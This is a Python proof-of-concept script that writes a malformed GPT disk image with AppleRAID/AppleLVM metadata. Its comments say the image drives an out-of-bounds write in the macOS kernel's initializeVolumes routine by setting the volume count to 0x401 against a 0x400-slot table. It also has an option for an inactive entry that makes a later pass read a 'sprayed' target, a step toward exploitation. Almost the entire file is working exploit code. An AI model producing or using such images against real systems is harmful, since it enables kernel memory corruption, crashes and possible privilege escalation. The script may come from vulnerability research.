#!/usr/bin/env python3
# build_applelvm_initvol2.py — initializeVolumes OOB, built on the WORKING Tier-1 base
# (build_applelvm_poc.py GPT/header/plist that AppleRAID accepts). Difference from Tier-1:
#  - toc_nentries (primary[0x38]) = 0x401 (so the FIXED 0x2000=0x400-slot volume table OOBs at idx 0x400)
#  - MetaData1Used large enough that the readPrimaryMetaData byteswap march (0x240 + n*0x80) stays IN-BOUNDS
#    (so it does NOT panic in readPrimaryMetaData; we want to reach initializeVolumes instead)
#  - ACTIVE TOC slots (primary+0x240+i*0x80) -> 0x200 volume records after the TOC region
#    so each entry creates a volume; entry 0x400's table store str x22,[table+0x2000] = OOB (gzalloc panic).
import struct, uuid, os
SECT=512
PART_FIRST_LBA=40
NENT=int(os.environ.get("LVM_TOC","0x401"),0)
TOC_BASE=0x240
REC=0x200
PRIM_OFF=0x1000
TOC_END=TOC_BASE + NENT*0x80 + 0x18
DEFAULT_RECS_BASE=max(0x22000, (PRIM_OFF + TOC_END + 0xfff) & ~0xfff)
RECS_BASE=int(os.environ.get("LVM_RECS_BASE", str(DEFAULT_RECS_BASE)),0)
# MetaData1 sizes the primary buffer for the byteswap -> must exceed the TOC march.
META1=(TOC_END + 0xfff) & ~0xfff
RECS_END=RECS_BASE + NENT*REC
PART_BYTES=((max(PRIM_OFF+META1, RECS_END)+0xfff)&~0xfff)+0x1000
MEMBER_OFF=PART_BYTES-0x1000
PART_SECTORS=PART_BYTES//SECT
PART_LAST_LBA=PART_FIRST_LBA+PART_SECTORS-1
IMG_SECTORS=PART_LAST_LBA+34+1
IMG=bytearray(IMG_SECTORS*SECT)
OUT=os.path.expanduser(os.environ.get("LVM_OUT","~/applelvm_initvol2.img"))

RAID_TYPE="52414944-0000-11AA-AA11-00306543ECAC"
DISK_GUID="11111111-2222-3333-4444-555555555555"
PART_GUID="aaaaaaaa-bbbb-cccc-dddd-eeeeeeee0001"
SET_UUID="11111111-1111-1111-1111-111111111111"
MEMBER_UUID="22222222-2222-2222-2222-222222222222"

def le_guid(s): return uuid.UUID(s).bytes_le
def name72(s):
    r=s.encode("utf-16-le"); return r+b"\x00"*(72-len(r))
def gpt_entry(tg,ug,first,last,nm):
    return le_guid(tg)+le_guid(ug)+struct.pack("<QQQ",first,last,0)+name72(nm)
import zlib
def gpt_header(cur,bak,entries_lba,entry_crc,first_usable,last_usable):
    h=bytearray(SECT)
    struct.pack_into("<8sIIIIQQQQ16sQIII",h,0,b"EFI PART",0x00010000,92,0,0,
        cur,bak,first_usable,last_usable,le_guid(DISK_GUID),entries_lba,128,128,entry_crc)
    struct.pack_into("<I",h,16,zlib.crc32(h[:92])&0xffffffff)
    return bytes(h)

struct.pack_into("<B3sB3sII",IMG,0x1BE,0,b"\x00\x02\x00",0xEE,b"\xFF\xFF\xFF",1,min(IMG_SECTORS-1,0xFFFFFFFF))
IMG[0x1FE:0x200]=b"\x55\xAA"
entries=bytearray(128*128)
entries[0:128]=gpt_entry(RAID_TYPE,PART_GUID,PART_FIRST_LBA,PART_LAST_LBA,"AppleRAID")
ecrc=zlib.crc32(entries)&0xffffffff
first_usable=34; last_usable=IMG_SECTORS-34
IMG[1*SECT:2*SECT]=gpt_header(1,IMG_SECTORS-1,2,ecrc,first_usable,last_usable)
IMG[2*SECT:2*SECT+len(entries)]=entries
bentries_lba=IMG_SECTORS-1-32
IMG[bentries_lba*SECT:bentries_lba*SECT+len(entries)]=entries
IMG[(IMG_SECTORS-1)*SECT:IMG_SECTORS*SECT]=gpt_header(IMG_SECTORS-1,1,bentries_lba,ecrc,first_usable,last_usable)

pbase=PART_FIRST_LBA*SECT
prim=pbase+PRIM_OFF
IMG[prim:prim+16]=b"AppleRAIDPrimary"
struct.pack_into(">Q",IMG,prim+0x20,0)
struct.pack_into(">Q",IMG,prim+0x28,META1)       # MetaData1Size
struct.pack_into(">I",IMG,prim+0x30,0)
struct.pack_into(">I",IMG,prim+0x34,0)
struct.pack_into(">Q",IMG,prim+0x38,NENT)        # toc_nentries / volume_count = 0x401

def vol_xml(g,v):
    return (f"<dict><key>AppleLVM-GroupUUID</key><string>{g}</string>"
            f"<key>AppleLVM-VolumeUUID</key><string>{v}</string>"
            f"<key>AppleLVM-Sequence</key><integer>1</integer>"
            f"<key>AppleLVM-ExtentCount</key><integer>0</integer>"
            f"<key>AppleLVM-VolumeSize</key><integer>4096</integer>"
            f"<key>AppleLVM-Type</key><string>concat</string></dict>\x00").encode()

# OOB-prefix bridge (Codex): make one OOB entry INACTIVE so the 2nd pass reads the preserved sprayed TARGET
INACTIVE_IDX=int(os.environ.get("LVM_INACTIVE_IDX","-1"),0)   # -1 = all active (orig OOB-write PoC)
for i in range(NENT):
    toc=prim+TOC_BASE+i*0x80
    rec_off=RECS_BASE+i*REC
    if i==INACTIVE_IDX:
        struct.pack_into(">Q",IMG,toc+0x00,0)    # INACTIVE -> first pass skips (no OOB write), 2nd pass reads sprayed slot
        continue
    struct.pack_into(">Q",IMG,toc+0x00,1)        # active marker
    struct.pack_into(">Q",IMG,toc+0x08,rec_off)  # readLogicalVolumeEntry offset
    struct.pack_into(">I",IMG,toc+0x10,REC)      # size 0x200
    rec=pbase+rec_off
    IMG[rec:rec+16]=b"AppleLVMVolume\x00\x00"
    struct.pack_into(">I",IMG,rec+0x20,REC)
    struct.pack_into(">I",IMG,rec+0x24,0)
    vu=f"{i:08x}-2222-2222-2222-222222222222"
    xml=vol_xml(SET_UUID,vu)
    IMG[rec+0x40:rec+0x40+len(xml)]=xml

hdr=pbase+MEMBER_OFF
IMG[hdr:hdr+16]=b"AppleRAIDHeader\x00"
struct.pack_into(">Q",IMG,hdr+0x90,PRIM_OFF)
plist=('<?xml version="1.0" encoding="UTF-8"?>\n'
 '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
 '<plist version="1.0"><dict>'
 '<key>AppleRAID-LevelName</key><string>LVG</string>'
 '<key>AppleRAID-HeaderVersion</key><integer>2</integer>'
 '<key>AppleRAID-SetName</key><string>x</string>'
 f'<key>AppleRAID-SetUUID</key><string>{SET_UUID}</string>'
 f'<key>AppleRAID-MemberUUID</key><string>{MEMBER_UUID}</string>'
 '<key>AppleRAID-MemberIndex</key><integer>0</integer>'
 '<key>AppleRAID-MemberType</key><string>AppleRAID-Members</string>'
 f'<key>AppleRAID-Members</key><array><string>{MEMBER_UUID}</string></array>'
 '<key>appleraid-MemberCount</key><integer>1</integer>'
 '<key>AppleRAID-SequenceNumber</key><integer>1</integer>'
 '<key>AppleRAID-ChunkSize</key><integer>4096</integer>'
 '<key>AppleRAID-ChunkCount</key><integer>1</integer>'
 f'<key>AppleRAID-MetaData1Used</key><integer>{META1}</integer>'
 '<key>AppleRAID-MetaData2Size</key><integer>0</integer>'
 '</dict></plist>\x00').encode()
IMG[hdr+0x98:hdr+0x98+len(plist)]=plist
open(OUT,"wb").write(IMG)
print(f"[*] wrote {OUT} ({len(IMG)} bytes); NENT={hex(NENT)} META1={hex(META1)} PART_BYTES={hex(PART_BYTES)}")
print(f"    byteswap march end = 0x{TOC_END:x} (< META1 {hex(META1)} => in-bounds, reaches initializeVolumes)")
print(f"    volume records @ partition+{hex(RECS_BASE)}+i*0x200; inactive_idx={hex(INACTIVE_IDX) if INACTIVE_IDX >= 0 else 'none'}")
print(f"    initializeVolumes table OOB starts at idx 0x400 -> table+0x2000")
